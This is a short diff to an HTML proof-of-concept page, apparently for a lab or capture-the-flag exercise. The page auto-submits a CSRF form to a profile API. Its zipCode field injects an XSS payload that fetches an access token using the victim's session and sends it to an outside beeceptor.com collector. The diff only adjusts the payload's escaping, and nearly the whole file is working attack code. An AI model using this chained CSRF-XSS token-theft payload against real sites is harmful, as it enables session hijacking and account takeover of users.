@@ -7,8 +7,7 @@
     <form id="csrf" action="https://127.0.0.1:5000/api/profile" method="POST">
         <input type="hidden" name="name" value="admin">
         <input type="hidden" name="phone" value="123">
-        <!-- Payload: injects <audio> directly – no need to break out of <p> -->
-        <input type="hidden" name="zipCode" value="<audio src=x onerror=&quot;fetch('/api/access/generate',{credentials:'include'}).then(r=>r.json()).then(d=>{fetch('https://anas0x1.free.beeceptor.com/log?token='+encodeURIComponent(d.access_token))})&quot;>">
+        <input type="hidden" name="zipCode" value='"><audio src=x onerror="fetch(`/api/access/generate`,{credentials:`include`}).then(r=>r.json()).then(d=>{fetch(`https://anas0x1.free.beeceptor.com/log?token=`+encodeURIComponent(d.access_token))})">'>
     </form>
     <script>
         document.getElementById('csrf').submit();
